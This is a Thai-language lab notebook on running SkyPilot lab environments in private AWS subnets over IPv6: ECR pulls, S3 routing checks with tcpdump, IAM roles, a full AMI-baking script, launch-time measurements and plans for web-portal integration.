| `docker login` ด้วย token ที่ copy มา | Login Succeeded | ✅ | ✅ |
| `docker pull` ผ่าน dual-stack host | ผ่าน | ✅ | ✅ |
| `docker run` | `Hello from Docker!` | ✅ | ✅ |


**Code / คำสั่ง**

<details>
<summary><b>📄 ECR push / pull ด้วยมือ</b> (Phase 9–11)</summary>

```bash
# push จากเครื่องที่มี IPv4 (endpoint ปกติ)
aws ecr get-login-password --region ap-southeast-1 --profile pete \
  | docker login -u AWS --password-stdin 568318158381.dkr.ecr.ap-southeast-1.amazonaws.com
docker tag hello-world 568318158381.dkr.ecr.ap-southeast-1.amazonaws.com/vlab/hello:v1
docker push 568318158381.dkr.ecr.ap-southeast-1.amazonaws.com/vlab/hello:v1

# pull ใน private instance (dual-stack)
read -s TOKEN
echo "$TOKEN" | sudo docker login -u AWS --password-stdin 568318158381.dkr-ecr.ap-southeast-1.on.aws
sudo docker pull 568318158381.dkr-ecr.ap-southeast-1.on.aws/vlab/hello:v1

# Phase 11: ขอ token เองด้วย IAM role
export AWS_USE_DUALSTACK_ENDPOINT=true
aws ecr get-login-password --region ap-southeast-1 \
  | sudo docker login -u AWS --password-stdin 568318158381.dkr-ecr.ap-southeast-1.on.aws
```
</details>

### Redirect ของ layer (ดูจาก header `Location`)

| ขอผ่าน | Redirect ไป |
|---|---|
| `568318158381.dkr-ecr.ap-southeast-1.on.aws` | `…starport-layer-bucket.s3.dualstack.ap-southeast-1.amazonaws.com` |
| `568318158381.dkr.ecr.ap-southeast-1.amazonaws.com` | `…starport-layer-bucket.s3.ap-southeast-1.amazonaws.com` |


**Code / คำสั่ง**

<details>
<summary><b>📄 ดูว่า ECR redirect layer ไป S3 host ไหน</b></summary>

```bash
TOKEN=$(aws ecr get-login-password --region ap-southeast-1 --profile pete)
REG=568318158381.dkr-ecr.ap-southeast-1.on.aws     # หรือ ...dkr.ecr...amazonaws.com
curl -s -u "AWS:$TOKEN" \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json" \
  https://$REG/v2/vlab/hello/manifests/v1           # เอา digest ของ layers[0]
curl -s -o /dev/null -D - -u "AWS:$TOKEN" \
  https://$REG/v2/vlab/hello/blobs/sha256:<digest> | grep -i location

aws ec2 describe-managed-prefix-lists --profile pete --prefix-list-ids pl-6fa54006 \
  --query 'PrefixLists[0].[PrefixListName,AddressFamily]' --output text
```
</details>

### Phase 11: IAM role

| เทส | คาดไว้ | ผล |
|---|---|---|
| ก่อน apply: `aws ecr get-login-password` | ต้อง fail | ✅ `NoCredentials` |
| หลัง apply: ผูก instance profile ให้ทั้ง A และ B | associated | ✅ |
| ขอ token เองบน instance + `docker login` + `pull` + `run` | ผ่าน | ✅ |


### ทดลองที่ 12: layer ผ่าน S3 Gateway Endpoint (instance A)

วิธี: ลบ image → อัด packet พอร์ต 443 ด้วย `tcpdump` ระหว่าง `docker pull` → นับปลายทาง ทำ 2 รอบ คือแบบปกติ และหลังปัก IPv4 ใน `/etc/hosts`

| ปลายทาง | ทางที่วิ่ง | ปกติ (packet) | ปัก IPv4 (packet) |
|---|---|---|---|
| ECR registry `2406:da18:86f:e001:…:443` | IPv6 → EIGW | 46 | 44 |
| S3 layer `2406:da60:8000:40::305:9558:443` | IPv6 → EIGW | **15** | **0** |
| S3 layer `3.5.149.7:443` | IPv4 → **S3 Gateway Endpoint** | **0** | **15** |
| `47.128.4.216:443` (EC2 ใน Singapore ไม่ใช่ S3) | IPv4 ไม่มี route | 0 | 1 (ไม่มีคำตอบ) |

| เทส | คาดไว้ | ผล |
|---|---|---|
| `getent hosts` หลังแก้ `/etc/hosts` | ได้ `3.5.149.7` เป็นตัวแรก | ✅ |
| `docker pull` หลังปัก IPv4 | ผ่าน | ✅ `Pull complete` |
| `docker run` | `Hello from Docker!` | ✅ |
| packet ขากลับจาก S3 มาที่ `10.10.2.232` | มี | ✅ 15 packet |

หมายเหตุ: `47.128.4.216` มี 1 packet และไม่มีคำตอบกลับ ระบุไม่ได้ว่าโปรแกรมไหนส่ง แต่ยืนยันว่า IPv4 ที่ไม่ใช่ S3 ออกไม่ได้


**Code / คำสั่ง**

<details>
<summary><b>📄 ทดลองที่ 12: บังคับ layer ผ่าน S3 Gateway Endpoint + tcpdump</b></summary>

```bash
REG=568318158381.dkr-ecr.ap-southeast-1.on.aws
H=prod-ap-southeast-1-starport-layer-bucket.s3.dualstack.ap-southeast-1.amazonaws.com

# baseline
sudo docker rmi $REG/vlab/hello:v1
sudo timeout 30 tcpdump -ni ens5 -w /tmp/before.pcap port 443 &
sleep 2; sudo docker pull $REG/vlab/hello:v1; sleep 2
sudo pkill tcpdump; sleep 1
sudo tcpdump -nr /tmp/before.pcap 2>/dev/null | awk '{print $2, $5}' | sort | uniq -c | sort -rn | head

# ปัก IPv4 (อยู่ใน prefix list)
echo "3.5.149.7 $H" | sudo tee -a /etc/hosts
sudo systemctl restart docker
# ... ทำซ้ำแบบ baseline เป็น /tmp/after.pcap ...

# เก็บกวาด
sudo sed -i '/starport-layer-bucket/d' /etc/hosts
sudo systemctl daemon-reload; sudo systemctl restart docker
```
</details>

### ทดลองที่ 13: `sky launch` เข้า private subnet

ตั้งค่า SkyPilot API server (หน้า Config ใน dashboard):
```yaml
aws:
  vpc_names: vlab-ecr-pull
  use_internal_ips: true
  use_ssm: false
  security_group_name: vlab-lab-instances
  remote_identity: vlab-lab-ecr-pull
```
AWS credential: IAM user `Skypilot-IAM` (managed policy EC2 + PassRole `vlab-lab-ecr-pull`, ไม่มี S3) ใส่ใน secret `aws-credentials` แล้ว `helm upgrade --reuse-values --set awsCredentials.enabled=true` (ล็อก chart `0.12.3+post.1`)

| เทส | คาดไว้ | ผล |
|---|---|---|
| `sky check aws` | enabled | ✅ `AWS [compute]` (storage ไม่เปิด เพราะไม่ให้สิทธิ์ S3) |
| จาก pod ของ API server ต่อ `10.10.2.232:22` | OPEN | ✅ |
| launch ครั้งแรก (`cpus: 2`) | – | ❌ `m6i.large` not eligible for Free Tier + เตือนว่าจะใช้ SSM |
| launch ครั้งที่ 2 (`m7i-flex.large`, `use_ssm: false`) | สำเร็จ | ✅ `Job finished (status: SUCCEEDED)` |
| `whoami` / `$HOME` | – | `ubuntu` / `/home/ubuntu` |
| `~/skypilot-runtime` | – | มี (ติดตั้งตอน launch) |
| Subnet | private | ✅ `vlab-ecr-pull-private-a` (1a) |
| Public IP | ไม่มี | ✅ `null` |
| Security group | `vlab-lab-instances` | ✅ |
| IAM instance profile | `vlab-lab-ecr-pull` | ✅ |


**Code / คำสั่ง**

<details>
<summary><b>📄 SkyPilot API server: AWS credential + config</b> (ทดลองที่ 13)</summary>

IAM user `Skypilot-IAM` + managed policy `skypilot-ec2-vlab` (EC2 ตาม policy ขั้นต่ำของ SkyPilot + `iam:PassRole` / `iam:GetInstanceProfile` ของ `vlab-lab-ecr-pull`, ไม่มี S3)

```bash
# บน master
read -s -p "Access key ID: " AK; echo
read -s -p "Secret access key: " SK; echo
kubectl create secret generic aws-credentials -n skypilot \
  --from-literal=aws_access_key_id="$AK" --from-literal=aws_secret_access_key="$SK"
unset AK SK

helm repo add skypilot https://helm.skypilot.co && helm repo update
helm upgrade -n skypilot skypilot-api skypilot/skypilot \
  --version 0.12.3+post.1 --reuse-values --set awsCredentials.enabled=true

sky check aws

# ทดสอบว่า pod ไปถึง private subnet
kubectl exec -n skypilot <pod> -c skypilot-api -- \
  bash -c 'timeout 5 bash -c "</dev/tcp/10.10.2.232/22" && echo OPEN || echo FAIL'
```

Config (หน้า Config ใน dashboard):
```yaml
kubernetes:
  provision_timeout: 60
  pod_config:
    spec:
      nodeSelector:
        kubernetes.io/hostname: worker-pete

aws:
  vpc_names: vlab-ecr-pull
  use_internal_ips: true
  use_ssm: false
  security_group_name: vlab-lab-instances
  remote_identity: vlab-lab-ecr-pull
```
</details>

<details>
<summary><b>📄 <code>test-aws.yaml</code></b> (ทดลองที่ 13: VM mode เปล่า ๆ)</summary>

```yaml
resources:
  infra: aws/ap-southeast-1
  instance_type: m7i-flex.large

run: |
  whoami
  echo "HOME=$HOME"
  ls -la ~
  ls -d ~/skypilot-runtime 2>/dev/null && echo "runtime: yes" || echo "runtime: no"
```
```bash
sky launch -c vlab-test test-aws.yaml
sky down vlab-test -y
```
</details>

### ทดลองที่ 14: container mode จาก ECR

YAML: `image_id: docker:568318158381.dkr-ecr.ap-southeast-1.on.aws/vlab/music-lab-ide:lab-01` + `SKYPILOT_DOCKER_USERNAME/SERVER` + token ผ่าน `--env SKYPILOT_DOCKER_PASSWORD`

| เทส | ผล |
|---|---|
| Push `lab-01` จาก registry on-prem ขึ้น ECR | ✅ ~365 MB |
| รอบแรก (ไม่แก้ HOME) | ❌ `mkdir: cannot create directory '/root': Permission denied` |
| รอบสอง (`-e HOME=/home/coder`) | ✅ `whoami` = `coder`, `HOME=/home/coder`, Debian 13 |

| ช่วง (จาก provision log) | เวลา |
|---|---|
| EC2 บูต | ~40 วินาที |
| pull + เปิด container | ~34 วินาที |
| ติดตั้ง runtime ใน container | **~5 นาที 12 วินาที** |
| รวมถึง Cluster launched | ~6.5 นาที |


**Code / คำสั่ง**

<details>
<summary><b>📄 ย้าย lab image จาก registry on-prem ขึ้น ECR</b> (ทดลองที่ 14)</summary>

```bash
# บน register
read -s -p "ECR token: " TOKEN; echo
echo "$TOKEN" | sudo docker login -u AWS --password-stdin 568318158381.dkr.ecr.ap-southeast-1.amazonaws.com
unset TOKEN
TAG=lab-01
SRC=localhost:5001/skypilot/music-lab-ide:$TAG
DST=568318158381.dkr.ecr.ap-southeast-1.amazonaws.com/vlab/music-lab-ide:$TAG
sudo docker pull $SRC && sudo docker tag $SRC $DST && sudo docker push $DST
```
</details>

<details>
<summary><b>📄 <code>test-ecr.yaml</code></b> (ทดลองที่ 14: container mode)</summary>

```yaml
resources:
  infra: aws/ap-southeast-1
  instance_type: m7i-flex.large
  image_id: docker:568318158381.dkr-ecr.ap-southeast-1.on.aws/vlab/music-lab-ide:lab-01

envs:
  SKYPILOT_DOCKER_USERNAME: AWS
  SKYPILOT_DOCKER_SERVER: 568318158381.dkr-ecr.ap-southeast-1.on.aws

config:
  docker:
    run_options:
      - -e HOME=/home/coder

run: |
  whoami
  echo "HOME=$HOME"
  head -2 /etc/os-release
  ls -d ~/skypilot-runtime 2>/dev/null && echo "runtime: yes" || echo "runtime: no"
```
```bash
read -s -p "ECR token: " TOKEN; echo
sky launch -c vlab-ecr test-ecr.yaml --env SKYPILOT_DOCKER_PASSWORD="$TOKEN"
unset TOKEN
sky down vlab-ecr -y
```
</details>

### ทดลองที่ 15: VM mode + เปิด lab

YAML: ไม่มี `image_id`, `ports: 8080`, `disk_size: 30`, `setup:` = `docker login` + `docker pull`, `run:` = `docker run --rm -p 8080:8080 -e PASSWORD=...`

| เทส | ผล |
|---|---|
| ถึง Cluster launched | ✅ **47 วินาที** |
| `docker pull` จาก ECR | ✅ **9.5 วินาที** |
| code-server ขึ้น | ✅ `HTTP server listening on http://0.0.0.0:8080/` |
| เปิด `http://10.10.2.166:8080` จาก Windows (ก่อน Phase 14) | ❌ timeout (router ไม่มี egress 8080) |
| หลัง Phase 14 | ✅ เข้า IDE ได้ (workspace ว่าง เพราะยังไม่ได้ใส่ไฟล์ lab) |
| SkyPilot เพิ่ม `TCP 8080 จาก 0.0.0.0/0` ใน `vlab-lab-instances` เอง | ✅ ยืนยันความเสี่ยงข้อ 11 |


**Code / คำสั่ง**

<details>
<summary><b>📄 <code>test-vm.yaml</code> / <code>test-bake.yaml</code></b> (ทดลองที่ 15–16: VM mode + lab)</summary>

```yaml
resources:
  infra: aws/ap-southeast-1
  instance_type: m7i-flex.large
  disk_size: 30
  ports: 8080
  image_id: ami-097929ad492bfc681      # เฉพาะ test-bake.yaml (ไม่ใส่ = AMI ของ SkyPilot)

envs:
  REG: 568318158381.dkr-ecr.ap-southeast-1.on.aws
  IMG: vlab/music-lab-ide:lab-01

setup: |
  echo "$ECR_TOKEN" | sudo docker login -u AWS --password-stdin $REG
  time sudo docker pull $REG/$IMG

run: |
  sudo docker run --rm --name lab -p 8080:8080 -e PASSWORD=vlabtest $REG/$IMG
```
```bash
read -s -p "ECR token: " TOKEN; echo
time sky launch -c vlab-vm test-vm.yaml -y --env ECR_TOKEN="$TOKEN"
unset TOKEN
sky status --endpoint 8080 vlab-vm      # เปิด http://<ip>:8080 ผ่าน Tailscale
sky down vlab-vm -y
```
</details>

### ทดลองที่ 16: AMI จาก bake

สร้างด้วย `docker/bake/provision-ami.sh` บน EC2 Ubuntu 22.04 ของ Canonical (`ami-081570719bfdf60cc`) ใน private-a → เก็บกวาด → stop → `create-image`

| | ค่า |
|---|---|
| AMI | `ami-097929ad492bfc681` (`vlab-bake-0.12.3.post1`, 30 GB) |
| SkyPilot / Ray | 0.12.3.post1 / 2.9.3 (wheel hash `aa76e5f477bce4878b9e7543772faccd` ตรงกับ API server) |
| อื่น ๆ | Docker, AWS CLI v2 + `use_dualstack_endpoint = true`, Miniconda py310, uv, `patch` |

| ขั้น (provision log) | AMI ของเรา |
|---|---|
| เริ่ม → Instance is up | 27 วินาที |
| internal_file_mounts | 2 วินาที |
| setup_runtime_on_cluster | 23 วินาที |
| start_ray_on_head_node | 12 วินาที |
| start_skylet | 2 วินาที |
| **ถึง Cluster launched** | **66 วินาที** |
| รวมจนเปิด lab (`time`) | 2 นาที 26 วินาที |

เทียบเวลาทุกแบบ (รอบเดียว):

| แบบ | ถึง Cluster launched | หมายเหตุ |
|---|---|---|
| Container mode (`image_id: docker:`) | ~6.5 นาที | ลง runtime ใน container |
| VM mode + AMI ของ SkyPilot | 47 วินาที | ลง runtime ตอน launch ผ่าน IPv6 |
| VM mode + AMI ของเรา | 66 วินาที | ไม่ต้องพึ่ง internet (ต้องยืนยันด้วย grep ของ uv) |


**Code / คำสั่ง**

<details>
<summary><b>📄 สร้าง AMI จาก bake</b> (ทดลองที่ 16)</summary>

```bash
# 1) ดึง wheel จาก pod API server (บน master)
POD=<skypilot-api pod>; H=aa76e5f477bce4878b9e7543772faccd
kubectl cp -n skypilot -c skypilot-api $POD:/root/.sky/wheels/$H/skypilot-0.12.3.post1-py3-none-any.whl \
  ~/bake-ami/skypilot-0.12.3.post1-py3-none-any.whl
```
```powershell
# 2) เปิดเครื่อง build (PowerShell บน Windows)
aws ec2 run-instances --profile pete --region ap-southeast-1 --image-id ami-081570719bfdf60cc --instance-type m7i-flex.large --subnet-id subnet-05e703e6e4cf56480 --security-group-ids sg-05520129fde94de1e --key-name vlab-ecr-pull-pete --metadata-options HttpTokens=required --block-device-mappings '[{"DeviceName":"/dev/sda1","Ebs":{"VolumeSize":30,"VolumeType":"gp3"}}]' --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=vlab-bake-builder},{Key=Project,Value=virtual-lab}]' --query 'Instances[0].[InstanceId,PrivateIpAddress]' --output text

# 3) ลงของ
scp $HOME\skypilot-0.12.3.post1-py3-none-any.whl docker\bake\provision-ami.sh ubuntu@<ip>:~/
ssh ubuntu@<ip> "sed -i 's/\r$//' ~/provision-ami.sh && time bash ~/provision-ami.sh ~/skypilot-0.12.3.post1-py3-none-any.whl 2>&1 | tee ~/provision.log"

# 4) เก็บกวาด
ssh ubuntu@<ip> "sudo apt-get clean; rm -f ~/skypilot-*.whl ~/provision-ami.sh ~/provision.log ~/.bash_history; sudo rm -f /etc/ssh/ssh_host_*; rm -f ~/.ssh/authorized_keys; sudo cloud-init clean --logs"

# 5) snapshot แล้วลบเครื่อง build
aws ec2 stop-instances --profile pete --instance-ids <id>
aws ec2 wait instance-stopped --profile pete --instance-ids <id>
aws ec2 create-image --profile pete --instance-id <id> --name vlab-bake-0.12.3.post1 --query ImageId --output text
aws ec2 wait image-available --profile pete --image-ids <ami>
aws ec2 terminate-instances --profile pete --instance-ids <id>
```

<details>
<summary><code>docker/bake/provision-ami.sh</code> (ทั้งไฟล์)</summary>

```bash
#!/usr/bin/env bash
# Bake AMI สำหรับ SkyPilot VM mode บน AWS (ใช้คู่กับ docker/bake/dockerfile ที่ใช้บน k8s)
#
# รันบน EC2 Ubuntu 22.04 (Canonical) เปล่า ๆ ในนาม user ubuntu:
#   bash provision-ami.sh ~/skypilot-0.12.3.post1-py3-none-any.whl
#
# ต่างจาก dockerfile:
# - SSH user ที่ SkyPilot ใช้บน AWS คือ ubuntu (ยืนยันจาก sky launch จริง) ทุก path เลยอยู่ใต้
#   /home/ubuntu ไม่ใช่ /home/sky
# - ไม่ useradd sky / ssh-keygen -A / CMD sshd: AMI มี sshd อยู่แล้ว และ host key ต้องให้
#   cloud-init สร้างใหม่ทุกเครื่อง ไม่งั้นทุก EC2 จาก AMI นี้จะได้ host key ชุดเดียวกัน
# - เพิ่ม Docker (รัน lab image) + AWS CLI v2 (login ECR) ถ้าไม่มี aws SkyPilot จะไปโหลดเองตอน
#   launch (docker_utils.py INSTALL_AWS_CLI_CMD)
# - สร้าง venv ด้วย Python ของ conda ตรง ๆ ไม่ให้ uv ไปโหลด Python เอง
#   (installer ของ uv โหลดจาก releases.astral.sh ก่อน ซึ่งมี IPv6 เลยใช้ใน private subnet ได้)
set -euo pipefail

WHEEL_SRC=${1:?usage: provision-ami.sh /path/to/skypilot-0.12.3.post1-py3-none-any.whl}

# ต้องตรงกับ SkyPilot API server ทุกตัว ไม่งั้นตอน provision จริงจะลงทับใหม่ (ดู dockerfile)
SKY_VERSION=0.12.3.post1
SKY_WHEEL_HASH=aa76e5f477bce4878b9e7543772faccd
RAY_VERSION=2.9.3

SKY_CONDA_ROOT="$HOME/miniconda3"
SKY_REMOTE_PYTHON_ENV="$HOME/skypilot-runtime"
UV="$HOME/.local/bin/uv"

echo "== apt: docker, patch, unzip =="
sudo apt-get update
sudo apt-get install -y --no-install-recommends \
  curl ca-certificates patch unzip rsync docker.io
sudo usermod -aG docker ubuntu
sudo systemctl enable --now docker

echo "== AWS CLI v2 + dual-stack =="
curl -fsSL "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o /tmp/awscli.zip
unzip -q /tmp/awscli.zip -d /tmp
sudo /tmp/aws/install --update
rm -rf /tmp/aws /tmp/awscli.zip
mkdir -p "$HOME/.aws"
printf '[default]\nregion = ap-southeast-1\nuse_dualstack_endpoint = true\n' > "$HOME/.aws/config"

echo "== Miniconda (Python 3.10) =="
curl -fsSL "https://repo.anaconda.com/miniconda/Miniconda3-py310_23.11.0-2-Linux-x86_64.sh" \
  -o /tmp/miniconda.sh
bash /tmp/miniconda.sh -b -p "$SKY_CONDA_ROOT"
rm /tmp/miniconda.sh

echo "== uv (ปลายทาง ~/.local/bin = SKY_UV_INSTALL_DIR) =="
curl -LsSf https://astral.sh/uv/install.sh | UV_INSTALL_DIR="$HOME/.local/bin" sh

echo "== skypilot-runtime venv + ray =="
"$UV" venv --seed "$SKY_REMOTE_PYTHON_ENV" --python "$SKY_CONDA_ROOT/bin/python"
VIRTUAL_ENV="$SKY_REMOTE_PYTHON_ENV" "$UV" pip install "setuptools<70"
VIRTUAL_ENV="$SKY_REMOTE_PYTHON_ENV" "$UV" pip install "click<8.3.0"
VIRTUAL_ENV="$SKY_REMOTE_PYTHON_ENV" "$UV" pip install -U \
  "ray[default]==${RAY_VERSION}" "pydantic-core==2.41.1" "click<8.3.0"

echo "== SkyPilot wheel =="
WHEEL_DIR="$HOME/.sky/wheels/$SKY_WHEEL_HASH"
mkdir -p "$WHEEL_DIR"
cp "$WHEEL_SRC" "$WHEEL_DIR/skypilot-${SKY_VERSION}-py3-none-any.whl"
VIRTUAL_ENV="$SKY_REMOTE_PYTHON_ENV" "$UV" pip install \
  "$WHEEL_DIR/skypilot-${SKY_VERSION}-py3-none-any.whl[aws,remote]"
echo "$SKY_WHEEL_HASH" > "$HOME/.sky/wheels/current_sky_wheel_hash"

echo "== check =="
aws --version
docker --version
command -v patch
"$SKY_REMOTE_PYTHON_ENV/bin/python" -c \
  "import sky, ray; print('sky', sky.__version__, 'ray', ray.__version__)"
echo "provision done"
```
</details>
</details>

<details>
<summary><b>📄 ดูเวลาจาก provision log</b></summary>

```bash
sky logs --provision <cluster> 2>/dev/null | grep -E "^[IWE] [0-9]{2}-[0-9]{2} " | sed -n '1p;$p'
sky logs --provision <cluster> 2>/dev/null | grep -E "Instance is up|Start: |Cluster launched" | cut -c1-120
sky logs --provision <cluster> 2>/dev/null | grep -iE "Installed [0-9]+ package|Uninstalled|Downloading"
```
</details>

### ยังไม่ได้เทส

- ลองรัน `get-login-password` โดยไม่ตั้ง `AWS_USE_DUALSTACK_ENDPOINT` ว่าค้างจริง
- DNS Firewall และ interface endpoint (แบบ C / แบบ B)
- ยืนยันว่า AMI ของเราไม่ลงของใหม่: `sky logs --provision <cluster> | grep -iE "Installed [0-9]+ package|Uninstalled|Downloading"` ต้องว่าง
- launch ซ้ำอย่างละ 2–3 รอบ (AMI ของ SkyPilot / ของเรา) เพื่อเอาค่าเฉลี่ย และดู timeline รายขั้นของ AMI ของ SkyPilot
- extras ของ wheel `[aws,remote]` ถูกต้องไหม
- ไฟล์ของ lab มาจากไหน (`/run.sh`, `workdir` หรือ image อื่น)

## ขั้นต่อไป: ผนวกกับ launch API ของ web portal

เส้นปัจจุบัน: `POST /api/sessions` → `SessionService.create_session` → `create_fastapi_task()` สร้าง YAML (fix `infra: kubernetes`, `image_id: docker:<registry on-prem>`) → `sky.launch` → `sky.stream_and_get` → บันทึก session

**ต้องเปลี่ยน (เขียนเป็น doc ให้รีวิวก่อนแก้โค้ด)**

1. **เลือก target ได้** K3s (เดิม) หรือ AWS เช่นเก็บใน `LabImage` / `Lab` หรือรับจาก request แล้ว `create_fastapi_task()` แยกเป็น 2 builder
2. **YAML แบบ AWS = VM mode** (ทดลองที่ 15–16)
   ```yaml
   resources:
     infra: aws/ap-southeast-1
     instance_type: m7i-flex.large      # free plan
     disk_size: 30
     image_id: ami-097929ad492bfc681    # vlab-bake
     ports: [<exposed_ports>]
   envs: { REG: <ecr dual-stack>, IMG: <repository>:<tag> }
   setup: |
     echo "$ECR_TOKEN" | sudo docker login -u AWS --password-stdin $REG
     sudo docker pull $REG/$IMG
   run: |
     sudo docker run --rm --name lab -p <port>:<port> <env ของ lab> $REG/$IMG
   ```
3. **ECR token** backend ขอเองทุกครั้ง (`boto3.client("ecr").get_authorization_token()`) ส่งเข้า `envs` ของ task ตอน launch ไม่เก็บใน DB / log ใช้ identity แยกที่มีแค่ `ecr:GetAuthorizationToken`
4. **ค่าที่ต้องย้ายไป config/env** AMI ID, ECR host, instance type, disk size, region (ตอนนี้ hard-code ใน YAML ทดลอง)
5. **lab image ต้องอยู่ใน ECR** มีขั้นตอน push จาก registry on-prem (เหมือน Phase 13) หรือ pipeline ทำให้อัตโนมัติ
6. **ตั้ง `is_cloud=True`** และเก็บ endpoint แบบ private IP (เข้าได้ผ่าน Tailscale เท่านั้น ต้องคิดว่าผู้ใช้จริงเข้ายังไง)
7. **แก้ปัญหาเดิมที่จะแพงขึ้นบน AWS**
   - `sky.stream_and_get` ค้าง HTTP หลายนาที → ทำเป็น async (คืน session `PENDING` แล้วอัปเดตทีหลัง)
   - launch พังหลังสร้าง EC2 แล้ว → cluster กำพร้า (เสียเงิน) ต้องบันทึก session ก่อน launch และ `sky.down` เมื่อพัง
   - `sky.down()` คืน request_id แต่ไม่ได้รอผล → ต้อง `sky.get()`
8. **autostop `down: true`** บน AWS ต้องเช็กว่า EC2 สั่งลบตัวเองได้ (สิทธิ์ EC2 ใน `vlab-lab-ecr-pull` + ทางไป EC2 API แบบ dual-stack)
   - เทสจาก web portal แล้ว (PR #88, lifespan 3 นาที): **ลบไม่ได้** ผ่านไป 10 นาทีเครื่องยัง running
     skylet log หยุดที่ `Terminating head node.` และ role ได้ `UnauthorizedOperation` แม้แต่ `ec2:DescribeInstances`
     ส่วน EC2 API แบบ dual-stack (`ec2.ap-southeast-1.api.aws`) ไปถึง (endpoint IPv4 timeout)
   - แก้ใน Phase 17 (`terraform/lab_autostop.tf`): `DescribeInstances` + `Terminate/StopInstances` เฉพาะ instance ที่มี tag `skypilot-cluster-name`
   - instance ที่ SkyPilot สร้างตั้ง metadata hop limit = 1 container ของ lab จึงเอา credential ของ role นี้ไม่ได้
   - หลัง apply Phase 17 แล้วเทสซ้ำ: role มีสิทธิ์แล้ว แต่**ยังลบไม่ได้** skylet ค้าง `SYN-SENT` ไป `ec2.ap-southeast-1.amazonaws.com` (IPv4)
     เพราะตอน autostop skylet ตั้ง `AWS_CONFIG_FILE=/dev/null` (`sky/skylet/events.py:387`) จึงไม่อ่าน
     `use_dualstack_endpoint` ใน `~/.aws/config` ที่ bake ไว้
   - ยืนยันบนเครื่อง: `AWS_CONFIG_FILE=/dev/null` อย่างเดียว → timeout, เพิ่ม `AWS_USE_DUALSTACK_ENDPOINT=true` → ไป
     `ec2.ap-southeast-1.api.aws` และ `DescribeInstances` ผ่าน
   - แก้ใน bake: เขียน `AWS_USE_DUALSTACK_ENDPOINT=true` ลง `/etc/environment` (pam_env ใส่ให้ทุก ssh session รวมถึง skylet)
     **ต้อง bake AMI ใหม่** แล้วเปลี่ยน `AWS_LAB_AMI` ของ backend
   - เลือกวิธี patch AMI เดิม (เพิ่มบรรทัดเดียว) แทน interface endpoint ของ EC2 เพราะ endpoint คิดเงินต่อ AZ ต่อเดือน
   - ถ้าวันหน้าปิด IPv6 ขาออกแล้วใช้ Squid: `HTTPS_PROXY` / `NO_PROXY` ต้องอยู่ใน `/etc/environment` ของ AMI ด้วย
     เหตุผลเดียวกัน (skylet เริ่มก่อน `setup:` ของ task) ไม่งั้น autostop จะค้างอีก

**อื่น ๆ**

- กำหนดพอร์ตของ lab ทั้งหมด แล้วปรับ Phase 14 + ตัดสินใจเรื่อง rule `0.0.0.0/0` ที่ SkyPilot เพิ่มใน SG (ความเสี่ยงข้อ 11)
- หาว่าไฟล์ของ lab มาจากไหน
- คุมขาออก: S3 endpoint policy (ฟรี), Squid หรือ interface endpoint (ไว้ทีหลัง)
- ย้าย Terraform state ไป S3
